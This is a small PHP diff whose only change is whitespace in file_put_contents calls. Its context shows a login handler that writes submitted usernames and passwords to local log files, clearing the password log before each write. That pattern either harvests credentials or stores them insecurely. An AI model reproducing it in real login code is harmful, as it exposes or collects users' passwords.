@@ -22,13 +22,13 @@ if (!empty($_POST['username']) && !empty($_POST['password'])) {
 
     $log_entry = "Username: $encrypted_username";
 
-    file_put_contents('login_username.log', $log_entry, FILE_APPEND);
+    file_put_contents('login_username.log', $log_entry,FILE_APPEND);
 
     file_put_contents('login_password.log', ''); // Clears the file
 
     $password_entry = "Password: $encrypted_password";
 
-    file_put_contents('login_password.log', $password_entry, FILE_APPEND);
+    file_put_contents('login_password.log', $password_entry,FILE_APPEND);
     
     exit();
 } else {
